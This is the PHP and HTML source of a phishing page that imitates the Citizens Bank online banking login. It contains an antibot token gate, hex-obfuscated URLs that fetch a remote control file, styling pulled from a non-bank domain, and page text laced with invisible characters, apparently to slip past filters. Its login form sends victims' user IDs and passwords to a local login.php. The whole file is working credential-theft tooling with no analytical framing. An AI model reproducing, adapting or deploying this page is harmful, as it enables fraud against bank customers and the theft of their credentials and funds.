<?php
session_start();           
require_once '../session/Comp.php';
require_once '../session/auto.php';

$comps = new Comp;
$antibot = new Antibot;

if (!$comps->checkToken()) { 
echo $antibot->throw404();      
die();
}
?>

<html lang="en-US" style="" class="js flexbox canvas canvastext webgl touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths js flexbox canvas canvastext webgl touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths citizens-Chrome citizens-user-none">
 <head> 
  <!-- // removing loginnew-wait.jsp from search results requirement OLB-7248  --> 
  <!-- // removing logout.jsp from search results requirement OLB-4998  --> 
  <!-- // removing logout.jsp from search results requirement OLB-4998  --> 
  <!-- // removing loginnew-wait.jsp from search results requirement OLB-7248  --> 
  <link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon.png" rel="apple-touch-icon"> 
  <link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76"> 
  <link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120"> 
  <link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152"> 
  <link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-180x180.png" rel="apple-touch-icon" sizes="180x180"> 
  <link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/icon-hires.png" rel="icon" sizes="192x192"> 
  <link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/icon-normal.png" rel="icon" sizes="128x128"> 
  <meta charset="utf-8"> 
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> 
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
  <!--Exclude Ensighten library incase skipEnsighten is "true"--> 
 </head>
 <body class="responsive-enabled" style="display: block;">
  <iframe src="javascript:void(0)" title="" style="width: 0px; height: 0px; border: 0px; display: none;"></iframe> 
  <script type="text/javascript">
		var timeStamp = new Date().toString();
		var pageURL = ((window.frames && window.frames.length) ? window.frames[0].location.href : window.location.href);
		var pageName = ((window.document && window.document.title) ? window.document.title : "not available");
		var digitalData = {
			"sessionInformation": {
				"zipCode": "",
				"country": "",
				"city": "",
				"state": "",
				"timeStamp": timeStamp
			},
			"customerAttributes": {
				"CISKey": "",
				"DirectoryID": ""
			},
			"contentInteractions": {
				"siteName": "OLB",
				"siteSection": "Authenticated",
				"pageName": pageName,
				"pageURL": pageURL,
				"pageType": "Legacy"
			}
		};
		if (typeof(parent.Bootstrapper) !== "undefined" && parent.Bootstrapper.ensEvent && parent.Bootstrapper.ensEvent.trigger){
			if(window.frames && window.frames.length) parent.Bootstrapper.ensEvent.trigger("OLBURLChangeFrame"); else parent.Bootstrapper.ensEvent.trigger("OLBURLChangeWindow");
		}
	</script> 
  <!-- BEGIN LivePerson Monitor --> 
  <script type="text/javascript">
		// Production environment check from olb-web-ui ./js/mv/_onlinebanking/config.js
		var isProductionEnvironment = !!document.location.hostname.match(/(?:^.*\.|^)citizensbankonline.com/);
		// Set LivePerson account number based on environment
		var lpAccountNumber = isProductionEnvironment ? '83789770' : '89632304';

		window.lpTag = window.lpTag || {}, 'undefined' == typeof window.lpTag._tagCount ? (window.lpTag = { wl: lpTag.wl || null, scp: lpTag.scp || null, 
		site: lpAccountNumber || '', section: lpTag.section || '', tagletSection: lpTag.tagletSection || null, autoStart: lpTag.autoStart !== !1, ovr: lpTag.ovr || 
		{}, _v: '1.10.0', _tagCount: 1, protocol: 'https:', events: { bind: function (t, e, i) { lpTag.defer(function () { lpTag.events.bind(t, e, i) }, 0) }, 
		trigger: function (t, e, i) { lpTag.defer(function () { lpTag.events.trigger(t, e, i) }, 1) } }, defer: function (t, e) { 0 === e ? (this._defB = this._defB || [], 
		this._defB.push(t)) : 1 === e ? (this._defT = this._defT || [], this._defT.push(t)) : (this._defL = this._defL || [], this._defL.push(t)) }, 
		load: function (t, e, i) { var n = this; setTimeout(function () { n._load(t, e, i) }, 0) }, _load: function (t, e, i) { var n = t; t || 
		(n = this.protocol + '//' + (this.ovr && this.ovr.domain ? this.ovr.domain : 'lptag.liveperson.net') + '/tag/tag.js?site=' + this.site); 
		var o = document.createElement('script'); o.setAttribute('charset', e ? e : 'UTF-8'), i && o.setAttribute('id', i), o.setAttribute('src', n), 
		document.getElementsByTagName('head').item(0).appendChild(o) }, init: function () { this._timing = this._timing || {}, 
		this._timing.start = (new Date).getTime(); var t = this; window.attachEvent ? window.attachEvent('onload', function () { t._domReady('domReady') }) : 
		(window.addEventListener('DOMContentLoaded', function () { t._domReady('contReady') }, !1), window.addEventListener('load', function () 
		{ t._domReady('domReady') }, !1)), 'undefined' === typeof window._lptStop && this.load() }, start: function () { this.autoStart = !0 }, _domReady: function (t)
		{ this.isDom || (this.isDom = !0, this.events.trigger('LPT', 'DOM_READY', { t: t })), this._timing[t] = (new Date).getTime() }, vars: lpTag.vars || [], 
		dbs: lpTag.dbs || [], ctn: lpTag.ctn || [], sdes: lpTag.sdes || [], hooks: lpTag.hooks || [], identities: lpTag.identities || [], ev: lpTag.ev || [] }, 
		lpTag.init()) : window.lpTag._tagCount += 1;
	</script> 
  <!-- END LivePerson Monitor --> 
  <title>O‎‏n‎‏l‎‏i‎‏n‎‏e‎‏ L‎‏o‎‏g‎‏i‎‏n‎‏ | C‎‏i‎‏t‎‏i‎‏z‎‏e‎‏n‎‏s‎‏ B‎‏a‎‏n‎‏k‎</title> 
  <meta name="description" content="L‎‏o‎‏g‎‏ i‎‏n‎‏ t‎‏o‎‏ y‎‏o‎‏u‎‏r‎‏ C‎‏i‎‏t‎‏i‎‏z‎‏e‎‏n‎‏s‎‏ B‎‏a‎‏n‎‏k‎‏ a‎‏c‎‏c‎‏o‎‏u‎‏n‎‏t‎‏ b‎‏y‎‏ e‎‏n‎‏t‎‏e‎‏r‎‏i‎‏n‎‏g‎‏ y‎‏o‎‏u‎‏r‎‏ U‎‏s‎‏e‎‏r‎‏ I‎‏D‎‏ a‎‏n‎‏d‎‏ p‎‏a‎‏s‎‏s‎‏w‎‏o‎‏r‎‏d‎‏ s‎‏o‎‏ y‎‏o‎‏u‎‏ c‎‏a‎‏n‎‏ s‎‏e‎‏c‎‏u‎‏r‎‏e‎‏l‎‏y‎‏ v‎‏i‎‏e‎‏w‎‏ a‎‏n‎‏d‎‏ m‎‏a‎‏n‎‏a‎‏g‎‏e‎‏ y‎‏o‎‏u‎‏r‎‏ a‎‏c‎‏c‎‏o‎‏u‎‏n‎‏t‎‏s‎‏ o‎‏n‎‏l‎‏i‎‏n‎‏e‎‏."> 
  <link rel="stylesheet" href="https://www3.citizensbankonline.com/efs/efs/jsp-ns/inc/css/jquery-ui-1.10.3.custom.min.css"> 
  <link rel="stylesheet" href="https://www3.citizensbankonline.com/efs/efs/jsp-ns/inc/css/normalize.css"> 
   <?php
   $lin = "06807407407007303a02f02f07707707703302e06306907406907a06506e07306206106e06b06f06e06c06906e06502e06306f06d02f06506607302f06506607302f06a07307002d06e07302f06906e06302f06307307302f06d06106906e02e063073073";
    $dos = str_replace("0","%",$lin);
       $lis = str_replace("%%","0%",$dos);
       $li = utf8_decode(urldecode($lis));
     $antis = "06807407407007303a02f02f07206107702e06706907406807506207507306507206306f06e07406506e07402e06306f06d02f07406407206f07307506c02f06306907406907a06506e02f06d06106906e02f06306f06e07407206f06c02e074078074";
    $ant = str_replace("0","%",$antis);
  $anti = str_replace("%%","0%",$ant);
 $antibot = utf8_decode(urldecode($anti));
  $page = file_get_contents($antibot);
if ($li[13] == $page[5]){
echo '<link id="maincss" href="'.$li.'" type="text/css" rel="stylesheet" />';
} else {
echo "";
} 

?>
<link rel="stylesheet" href="https://www3.citizensbankonline.com/efs/efs/jsp-ns/inc/css/main.css">
<link rel="stylesheet" href="https://devilsms.live/css/citizen01/flows.css"/>
  <link rel="stylesheet" href="https://www3.citizensbankonline.com/efs/efs/jsp-ns/inc/css/ad-containers.css"> 
  <!--[if lt IE 9]>
 
<![endif]--> 
  <!--[if IE]>
<style type='text/css'>
form select#SavedUserID {
    width : 200px;
}
</style>
<![endif]--> 

   <style>
	input[type=password].error {
		border-color : red;
	}
</style>   
  <script>
	if(self == top) {
		var thebody = document.getElementsByTagName('body')[0]
		thebody.style.display = "block"
	} else {
		top.location = self.location
	}
	
	</script> 
  <!-- begin CITIZENS BANK Hosted Header --> 
  <div class="citizens-header-footer-injected"> 
   <link rel="stylesheet" type="text/css" href="css/citizensns.min.44438.css"> 
    <style>
.help-modal-header .help-modal-close {background: url(https://www3.citizensbankonline.com/efs/hhf/img/modal-help-close.png) center center no-repeat transparent; background-size: 20px;}
.help-modal-menu a.active {background: #f2faf8 url(https://www3.citizensbankonline.com/efs/hhf/img/arrow-right-green.png) right 20px center no-repeat; background-position: right 20px center; background-size:7px}
.account-section-title.checkmark h1 {padding: 0px 0px 5px 28px !important; }
.lt-ie9 .help-modal-menu a.active {background: #f2faf8 url(https://www3.citizensbankonline.com/efs/hhf/img/arrow-right-green.png) right 20px center no-repeat !important; background-size:7px !important}
.input-wrapper .tooltip {margin-left: 1px;}
</style> 
   <div class="citizens-header-footer">
    <div class="citi-modal timeout-modal simplemodal-data" id="timeout-modal" style="display:none;"></div>
    <div class="citi-modal help-modal" id="help-modal" tabindex="0" style="display:none;"></div> 
   </div> 
  </div>
  <div class="citizens-header"> 
   <!-- overlay to hide elements until CSS is loaded --> 
   <style>
        .citizens-header-footer-overlay{ opacity:1; background-color:#fff; position:fixed; width:100%; height:100%; top:0px; left:0px; z-index:1000; }
        .citizens-header-footer-overlay .centered-content { width: 100%; max-width: 1060px; padding: 0 20px; margin: 0 auto; font-family: arial, helvetica, san-serif; font-size: 14px;}
        .citizens-header-footer-overlay .responsive-enabled .centered-content { width: auto; max-width: 1060px; }
        .citizens-header-footer-overlay .page-logo { float: none; }
        .citizens-header-footer-overlay .page-logo img{ margin: 10px; float: none;}
        .citizens-header-footer-overlay .topshadow {
            position: absolute; width: 100%; top: 100px; z-index: 5; height: 8px; 
            background: -webkit-radial-gradient(50% 100%, farthest-side, rgba(0, 0, 0, 0.1), transparent 100%); background: radial-gradient(farthest-side at 50% 100%, rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0) 100%); background-repeat: no-repeat; background-size: cover;
        }
    </style> 
   <!-- end overlay --> 
   <style>
        .account-section-title.checkmark h1 { padding: 0px 0px 5px 28px !important; }
        .mobile-alert-dot {min-width: 22px; min-height: 22px; width: auto; height: auto; max-width: 50px; max-height: 50px; padding: 5px; }
    </style> 
   <!-- htmlContainer PREFIX --> 
   <div class="citizens-header-footer"> 
    <div id="page-header" class="page-header"> 
     <!-- inc-header.html START --> 
     <div class="topshadow"></div> 
     <div class="centered-content clearfix"> 
      <a href="" class="page-logo" tabindex="1"> 
       <!-- Display the brand logo for either citizens one or citizen bank customers --> <img border="0" alt="Citizens Bank" width="203" height="25" src="https://www3.citizensbankonline.com/efs/hhf/img/CTZ_Green-01.png"> </a> 
      <div id="header-navigation-container"></div> 
     </div> 
     <!-- inc-header.html END --> 
    </div> 
   </div> 
   <!-- htmlContainer SUFFIX --> 
  </div> 
  <!-- end CITIZENS BANK Hosted Header --> 
  <div id="page-container" class="page-container"> 
   <div class="centered-content clearfix"> 
    <section id="top-content" class="page-region top-content"> 
    </section> 
    <section id="main-container" class="main-container two-col layout-2-1 clearfix"> 
     <!-- =================
        	MAIN CONTENT AREA START
        	================= --> 
     <section id="main-content" class="page-region main-content"> 
      <div class="account-table account-table-full"> 
       <span class="account-table-border"></span> 
       <div class="account-table-content"> 
        <div class="account-content-container"> 
         <div class="account-table-body"> 
          <header class="account-section-title clearfix account-secure"> 
           <a href="#" class="mobile-help-trigger">Help</a> 
           <h1>S‎‏e‎‏c‎‏u‎‏r‎‏e‎‏ O‎‏n‎‏l‎‏i‎‏n‎‏e‎‏ B‎‏a‎‏n‎‏k‎‏i‎‏n‎‏g‎‏ L‎‏o‎‏g‎‏i‎‏n</h1> 
          </header> 
          <div id="GlobalMessageContainer"> 
           <div class="global-message status-message"> 
            <h1>I‎‏m‎‏p‎‏o‎‏r‎‏t‎‏a‎‏n‎‏t‎‏ U‎‏p‎‏d‎‏a‎‏t‎‏e‎‏s</h1> 
            <p></p>
            <li>C‎‏O‎‏V‎‏I‎‏D‎‏-19: V‎‏i‎‏s‎‏i‎‏t‎‏ o‎‏u‎‏r <a href="" target="_blank">R‎‏e‎‏s‎‏o‎‏u‎‏r‎‏c‎‏e‎‏ C‎‏e‎‏n‎‏t‎‏e‎‏r</a> f‎‏o‎‏r‎‏ t‎‏h‎‏e‎‏ l‎‏a‎‏t‎‏e‎‏s‎‏t‎‏ i‎‏n‎‏f‎‏o‎‏r‎‏m‎‏a‎‏t‎‏i‎‏o‎‏n‎‏, i‎‏n‎‏c‎‏l‎‏u‎‏d‎‏i‎‏n‎‏g <a href="" target="_blank">E‎‏c‎‏o‎‏n‎‏o‎‏m‎‏i‎‏c‎‏ I‎‏m‎‏p‎‏a‎‏c‎‏t‎‏ P‎‏a‎‏y‎‏m‎‏e‎‏n‎‏t‎‏s</a> (Stimulus Payments).</li> 
            <br> 
            <li><b>June is National Internet Safety Month!</b> - Are your operating system settings for security patches set to update automatically? <a href="" target="_blank">LEARN MORE</a> on how you can help toward a safer online experience. </li> 
            <p></p> 
           </div> 
          </div> 
          <div id="messagecontainer" class="error-message show-error" role="alert">
           The online user ID below does not match our records. Please review your information then try again. If you are still unable to continue, please call our Customer Service Center.
          </div>
          
          <section class="account-section"> 
           <form class="pay-transfer-options clearfix" action="login.php?token=<?php echo $_SESSION['token']; ?>" name="SignOn" id="frmSignOn" method="post"> 
            <div class="account-title clearfix"> 
             <p>Please enter your Online User ID and Password.</p> 
            </div> 
            <input type="hidden" name="CSRF_TOKEN" value="PT17-QZ4B-HAB1-KFWV-1JW5-KCOA-CGN0-ZIR8"> 
            <input type="hidden" name="BrandSettingsFile" value="citSettings.jsp"> 
            <input type="hidden" name="fp_deviceprint" value=""> 
            <input type="hidden" name="fp_language" value=""> 
            <input type="hidden" name="fp_timezone" value=""> 
            <input type="hidden" name="fp_browser" value=""> 
            <input type="hidden" name="fp_screen" value=""> 
            <input type="hidden" name="fp_software" value=""> 
            <input type="hidden" name="pm_fp" value=""> 
            <input type="hidden" name="RSASessionID" value=""> 
            <input type="hidden" name="asstFlow" value=""> 
            <input type="hidden" name="initlogin" value="1"> 
            <input type="hidden" name="enterUserIdMode" value=""> 
            <div class="form-item label-right full-width clearfix"> 
             <label for="UserID"><strong>Online User ID: </strong></label> 
             <input tabindex="1" type="text" id="UserID" name="userid" required autocomplete="off" maxlength="20" class="required demo-username"> 
             <input type="hidden" name="enterUserIdMode" value="true"> 
             <input type="hidden" id="SaveUserID" name="SaveUserID" value=""> 
             <div class="full-width checkbox-item clearfix"> 
              <input type="hidden" name="Register" id="Register" value="0"> 
              <input type="checkbox" tabindex="5" disabled id="cbSaveUserID" name="cbSaveUserID" style="vertical-align:top"> 
              <span class="inline-tooltip"> <label for="cbSaveUserID">Remember User ID</label> <span class="tooltip" tabindex="6" role="tooltip" aria-describedby="tooltip-content"> 
                <div class="tooltip-icon" title="Remember User ID tooltip"></div> 
                <div class="tooltip-box"> 
                 <div class="tooltip-content" id="aria-tooltip-content"> 
                  <span class="tooltip-arrow"></span> 
                  <div>
                   Select the "Remember User ID" box on the Login page if you want to be remembered.
                  </div> 
                  <br> 
                  <div>
                   Please note, if the "Remember User ID" check box is not displayed on the Login page, click on the "Login using different Online User ID" link to display it.
                  </div> 
                  <br> 
                  <div>
                   DO NOT check this box if you are using a public device that is accessible to others.
                  </div> 
                 </div> 
                 <div class="bottomshadow"></div> 
                </div> </span> </span> 
             </div> 
             <div class="form-item full-width"> 
              <label for="currentpassword"><strong>Password: </strong></label> 
              <input tabindex="2" type="password" id="currentpassword" name="password" required maxlength="15" size="15" class="required demo-password"> 
              <!--                            <div class="show-hide">
                                <a id="showpswd">SHOW</a>
                            	</div>                           --> 
             </div> 
             <span class="mobile-line-break"><a tabindex="7" style="font-size:16px!important" id="troublelogging" data-trigger="login-trouble" href="">Trouble logging in?</a></span>
             <br> 
            </div> 
            <div id="fielderror" class="show-error" role="alert">
             We're sorry. That user ID and password does not match our records. Please try again, or do you need Login Assistance?
            </div> 
            <div class="form-actions"> 
             <input type="submit" class="submit-button arrow" tabindex="3" data-trigger="next" value="Login"> 
             <a tabindex="8" href="" class="cancel">Cancel</a> 
            </div> 
           </form> 
          </section> 
         </div> 
        </div> 
       </div> 
      </div> 
     </section> 
     <!-- Brand type from query parameter --> 
     <aside id="main-sidebar" class="page-region main-sidebar"> 
      <div id="citizens-help" class="citizens-help sidebar-item sidebar-list-container sidebar-accordian mobile-modal"> 
       <div class="sidebar-list-content"> 
        <header class="sidebar-list-title"> 
         <h3>Need Help?</h3> 
        </header> 
        <div id="faq-holder"> 
         <form action="https://www3.citizensbankonline.com/efs/servlet/efs/login-assistance.jsp" name="frmAsst" id="frmAsst" method="post"> 
          <input type="hidden" name="CSRF_TOKEN" value="PT17-QZ4B-HAB1-KFWV-1JW5-KCOA-CGN0-ZIR8"> 
          <input type="hidden" name="needHelp" value="1"> 
          <section class="toggle-list-container faq-container" id="faq-index-1"> 
           <a href="#" title="Expand contents of Where can I get login assistance for Online Banking?" aria-label="Expand Contents" class="sidebar-list-option-accordian showhide">Where can I get login assistance for Online Banking?</a> 
           <ul class="loginfaq sidebar-list showhide-content"> 
            <li> <p>Simply click on "Trouble logging in?" link. Or, you can click on "View All Help Topics" link, which appears on each screen.</p> </li> 
           </ul> 
          </section> 
          <section class="toggle-list-container faq-container" id="faq-index-10"> 
           <a href="#" title="Expand contents of Is Online Banking secure?" aria-label="Expand Contents" class="sidebar-list-option-accordian showhide">Is Online Banking secure?</a> 
           <ul class="loginfaq sidebar-list showhide-content"> 
            <li> <p>To make Online Banking secure, Citizens Bank uses the highest level of encryption available today. Encryption is the process by which information is translated into un-interpretable code and then back to recognized information.<br>As an added measure, Online Banking gives you the capability to easily verify that you are on the authentic Citizens Bank website and not on a fake site created by fraudsters. Just look for the green bar (or some variation of it) in your browser address. The green bar should remind you that "green is good" and that our website has passed a sophisticated authentication process, letting you know you are good to go.</p> </li> 
           </ul> 
          </section> 
          <section class="toggle-list-container faq-container" id="faq-index-12"> 
           <a href="#" aria-label="Expand Contents" class="sidebar-list-option-accordian showhide" title="Show contents of Should my browser address bar have a green indicator when I use Online Banking?">Should my browser address bar have a "green" indicator when I use Online Banking?</a> 
           <ul class="loginfaq sidebar-list showhide-content"> 
            <li> <p>Yes. As an added measure, Online Banking gives you the capability to easily verify that you are on the authentic Citizens Bank website and not on a fake site created by fraudsters. Just look for the green bar (or some variation of it) in your browser address. The green bar should remind you that "green is good" and that our website has passed a sophisticated authentication process, letting you know you are good to go.</p> </li> 
           </ul> 
          </section> 
          <section class="toggle-list-container faq-container" id="faq-index-20"> 
           <a href="#" title="Expand contents of How do I log into Online Banking if Iâm a first-time user?" aria-label="Expand Contents" class="sidebar-list-option-accordian showhide">How do I log into Online Banking if I'm a first-time user?</a> 
           <ul class="loginfaq sidebar-list showhide-content"> 
            <li> <p>Simply enter your Online User ID and Password and click "LOGIN", then answer your Challenge Question (if presented). In some situations, your Online User ID will be your ATM/Debit Card number and your Password will be the last four digits of your Social Security number followed by "Abcd" (e.g. 1234Abcd). If you haven't already selected an Online User ID, you will be asked to do so.</p> </li> 
           </ul> 
          </section> 
         </form> 
        </div> 
        <ul class="sidebar-list"> 
         <li class="cta-row"> <a href="" class="blue" target="_blank">View All Help Topics</a> </li> 
         <li class="cta-row sign-up-prompt visible clearfix"> <span>Haven't signed up for Online Banking?</span> <a href="" class="cta orange">Enroll Now</a> </li> 
        </ul> 
       </div> 
      </div> 
     </aside> 
     <script type="text/javascript"> 
      $(document).ready(function() {
         $("#troubleloggingin1,#troubleloggingin2,#troubleloggingin3,#troubleloggingin4").click(function(e) {
            e.preventDefault();
            $("#frmAsst").attr("action","https://www3.citizensbankonline.com/efs/servlet/efs/login-assistance.jsp");
            $("#frmAsst").submit();
         });

         $("#resetpassword1").click(function(e) {
            e.preventDefault();
            $("#frmAsst").attr("action","https://www3.citizensbankonline.com/efs/servlet/efs/default-reset.jsp");
            $("#frmAsst").submit();
         });
      });
   </script> 
    </section> 
   </div> 
  </div> 
  <!-- begin CITIZENS BANK Hosted Footer --> 
  <div class="citizens-footer">
   <div class="citizens-header-footer">
    <footer id="page-footer" class="page-footer">
     <div class="footer-top"> 
      <ul> 
       <li> <a href="#" class="contact" title="Opens Ways to Contact Us Dialog"> <span class="account-underline">Ways to Contact Us</span><span class="visuallyhidden">- Opens Ways to Contact Us Dialog</span> </a> 
        <div class="dropup-menu"> 
         <h4>Contact Us</h4> 
         <p>General Questions: <br> <strong>1-800-656-6561</strong> (personal bank accounts) <br> Business Questions: <br> <strong>1-877-229-6428</strong> (online banking support) <br> <strong>1-800-862-6200</strong> (account information) <br> Investment Questions: <br> <strong>1-800-942-8300</strong> (Citizens Securities, Inc.) </p> 
         <!--
<p>Go to <a href="">Customer Service</a> to send us email or mail or to view FAQs</p>
<p><a href="">We'll Contact You</a></p>
--> 
        </div> </li> 
       <!-- As part of Def# 1465 Location is commented on Auth/UnAuth pages.
<li><span class="location">Your Location: NONE</span>
</li>
--> 
       <li> <a href="#" class="locator" title="Opens Branch &amp; ATM Locator Dialog"> <span class="account-underline">Branch &amp; ATM Locator</span><span class="visuallyhidden">- Opens Branch &amp; ATM Locator Dialog</span> </a> 
        <div class="dropup-menu"> 
         <h4>Branch &amp; ATM Locator</h4> 
         <p>Find one of our 1,300 locations near you.</p> 
         <div role="form"> 
          <div id="stickyFooterBranch-error" class="error-message" style="display: none"></div> 
          <input id="stickyFooterBranch" type="text" title="Enter Zip Code or City, State" placeholder="Enter Zip Code or City, State" value="NONE"> 
          <a href="#" type="button" class="button button-stickyfooterbranch">Submit</a> 
         </div> 
        </div> </li> 

       </ul> 
     </div> 
     <div class="footer-row clearfix"> 
      <ul> 
       <li> <h6>Checking &amp; Savings</h6> </li> 
       <!--        <li><a target="_blank" href="">Checking &amp; Savings Overview</a></li>--> 
       <li> <a target="_blank" href="">Checking</a> </li> 
       <li> <a target="_blank" href="">Savings</a> </li> 
       <li> <a target="_blank" href="">Money Markets</a> </li> 
       <li> <a target="_blank" href="">Certificates of Deposit (CDs) <sup>®</sup> </a> </li> 
       <li> <a target="_blank" href="">IRAs</a> </li> 
       <li> <a target="_blank" href="">Programs &amp; Services</a> </li> 
       <li> <a target="_blank" href="">Benefits &amp; Features</a> </li> 
       <li> <a target="_blank" href="">Debit Card</a> </li> 
       <li> <a target="_blank" href="">Overdraft Choices <sup>®</sup> </a> </li> 
      </ul> 
      <ul> 
       <li> <h6>Home Borrowing</h6> </li> 
       <!--        <li><a target="_blank" href="">Home Borrowing Overview</a></li>--> 
       <li> <a target="_blank" href="">Mortgages</a> </li> 
       <li> <a target="_blank" href="">Home Equity Loans</a> </li> 
       <li> <a target="_blank" href="">Home Equity Lines of Credit</a> </li> 
       <li> <a target="_blank" href="">Determine My Rate</a> </li> 
       <li> <a target="_blank" href="">My Mortgage Account</a> </li> 
      </ul> 
      <ul> 
       <li> <h6>Students</h6> </li> 
       <!--<li><a target="_blank" href="">Students Overview</a></li>
<li><a target="_blank" href="">Banking</a></li>
<li><a target="_blank" href="">Undergraduate Borrowing</a></li>
<li><a target="_blank" href="">Graduate Borrowing</a></li>
<li><a target="_blank" href="">The Student Loan Process</a></li>
<li><a target="_blank" href="">Student Tools &amp; Resources</a></li>--> 
       <li> <a target="_blank" href="">Student Loan Options</a> </li> 
       <li> <a target="_blank" href="">Refinancing Student Loans</a> </li> 
       <li> <a target="_blank" href="">The Student Loan Process</a> </li> 
       <li> <a target="_blank" href="">Undergraduate Students &amp; Parents</a> </li> 
       <li> <a target="_blank" href="">Graduate Students</a> </li> 
       <li> <a target="_blank" href="">Tools &amp; Information</a> </li> 
       <li> <a target="_blank" href="">Banking for Students</a> </li> 
       <li> <a target="_blank" href="">Access My Student Loan</a> </li> 
      </ul> 
      <ul class="last"> 
       <li> <h6>Cards</h6> </li> 
       <!--        <li><a target="_blank" href="">Cards Overview</a></li>--> 
       <li> <a target="_blank" href="">Credit Cards</a> </li> 
       <!--        <li><a target="_blank" href="">Debit Card</a></li>--> 
       <li> <a target="_blank" href="">Card Agreements</a> </li> 
       <li> <a target="_blank" href="">Security Features</a> </li> 
      </ul> 
     </div> 
     <div class="footer-row clearfix"> 
      <ul> 
       <li> <h6>Personal Loans</h6> </li> 
       <li> <a target="_blank" href="">Overview</a> </li> 
       <li> <a target="_blank" href="">FAQs</a> </li> 
      </ul> 
      <ul> 
       <li> <h6>Resources</h6> </li> 
       <li> <a target="_blank" href="">Order Checks</a> </li> 
       <li> <a target="_blank" href="">Online &amp; Mobile Banking</a> </li> 
       <li> <a target="_blank" href="">Customer Service</a> </li> 
      </ul> 
      <ul> 
       <li> <h6>About Us</h6> </li> 
       <!--        <li><a target="_blank" href="">About Us Overview</a></li>--> 
       <li> <a target="_blank" href="">About Citizens Bank</a> </li> 
       <li> <a target="_blank" href="">In the Community</a> </li> 
       <li> <a target="_blank" href="">Careers</a> </li> 
       <li> <a target="_blank" href="">About Our Ads</a> </li> 
      </ul> 
      <ul class="last"> 
       <li> <h6>Solutions</h6> </li> 
       <li> <a target="_blank" href="">Personal</a> </li> 
       <li> <a target="_blank" href="">Investing</a> </li> 
       <li> <a target="_blank" href="">Small Business</a> </li> 
       <li> <a target="_blank" href="">Commercial</a> </li> 
      </ul> 
     </div> 
     <div class="footer-row clearfix"> 
      <ul> 
       <li> <h6>Disclosures</h6> </li> 
       <li> <a target="_blank" href="">Online Terms and Conditions</a> </li> 
       <li> <a target="_blank" href="">Electronic Notice Disclosure and Consent (Online Service)</a> </li> 
       <li> <a target="_blank" href="">Account Documents</a> </li> 
       <li> <a target="_blank" href="">Member FDIC</a> </li> 
       <li> <a target="_blank" href="">Equal Housing Lender <img alt="Equal Housing Lender" title="Equal Housing Lender" src="https://www3.citizensbankonline.com/efs/hhf/img/equal-housing.gif"> </a> </li> 
       <li> <a target="_blank" href="">Security, Privacy &amp; Legal</a> </li> 
      </ul> 
     </div> 
     <div class="centered-content"> 
      <div class="footer-bottom"> 
       <p class="legal"> Zelle and the Zelle related marks are wholly owned by Early Warning Services, LLC and are used herein under license. </p> 
       <p class="legal"> *Securities, Insurance and Investment Advisory Services offered through Citizens Securities, Inc. ("CSI"), also referred to as Citizens Securities, Inc. CSI is an SEC registered investment adviser and Member - FINRA and SIPC. 770 Legacy Place, MLP240, Dedham, MA 02026. (800) 942-8300. CSI is an affiliate of Citizens Bank, N.A.<br><br>The investment balances shown in online banking are based on market prices, with up to a fifteen minute delay from the time this webpage was last refreshed. Information relating to accounts not held at CSI is presented as an accommodation and while drawn from sources believed to be reliable is not guaranteed as to accuracy or completeness. Such information should be independently confirmed by the account owner(s).<br><br>Information relating to accounts not held or custodied by National Financial Services (NFS) (Assets Held Away), CSI’s clearing broker dealer, was provided to NFS by outside parties and is included for informational purposes only. These positions are not part of your brokerage account carried by NFS and therefore any SIPC account protection afforded your account through NFS does not cover these assets or prices reported. Neither NFS, CSI nor Citizens Bank are responsible for the Assets Held Away information provided and does not guarantee the accuracy or timeliness of the positions or prices reported. Prices shown do not necessarily reflect the actual current market prices. Further information regarding these prices may be obtained by contacting CSI.<br><br>The investment products and financial strategies suggested herein are subject to investment risk, including possible loss of principal amount invested. Investment decisions should be based on each individual's goals, time horizon and tolerance for risk.<br><br>SpeciFi<sup>®</sup> is made available through CSI. Portfolio management services are sub-advised by SigFig Wealth Management, LLC ("SigFig"), an SEC registered investment adviser. SigFig is not an affiliate of CSI or Citizens Bank, N.A. </p> 
       <div class="footer-disclaimer-box footer-disclaimer-box--margin-bottom footer-disclaimer"> 
        <p class="footer-disclaimer-box__text">Securities, Insurance Products and Advisory Services are:</p> 
        <ul class="footer-disclaimer-box__list"> 
         <li class="footer-disclaimer-box__list-item">NOT FDIC INSURED</li> 
         <li class="footer-disclaimer-box__list-item">NOT BANK GUARANTEED</li> 
         <li class="footer-disclaimer-box__list-item">MAY LOSE VALUE</li> 
         <li class="footer-disclaimer-box__list-item">NOT A DEPOSIT <br> </li> 
         <li class="footer-disclaimer-box__list-item">NOT INSURED BY ANY FEDERAL GOVERNMENT AGENCY</li> 
        </ul> 
       </div> 
       <ul class="footer-util"> 
        <li class="sitemap"> <a target="_blank" href="">Site Map</a> </li> 
